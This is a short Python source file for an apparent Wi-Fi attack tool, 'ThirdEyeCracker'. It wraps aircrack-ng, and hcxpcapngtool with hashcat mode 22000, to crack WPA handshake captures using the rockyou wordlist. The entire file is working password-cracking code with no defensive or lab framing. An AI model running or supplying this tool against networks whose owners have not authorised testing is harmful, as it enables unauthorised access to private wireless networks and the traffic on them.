import subprocess, os
from colorama import Fore

class ThirdEyeCracker:
    def crack_wpa_standard(self, cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
        print(Fore.CYAN + "[*] Launching CPU Cracker...")
        subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, cap_file])

    def crack_with_hashcat(self, cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
        hash_file = cap_file.replace(".cap", ".hc22000")
        print(Fore.MAGENTA + "[*] Converting for Hashcat...")
        subprocess.run(["hcxpcapngtool", "-o", hash_file, cap_file])
        if os.path.exists(hash_file):
            subprocess.run(["hashcat", "-m", "22000", hash_file, wordlist, "--force"])
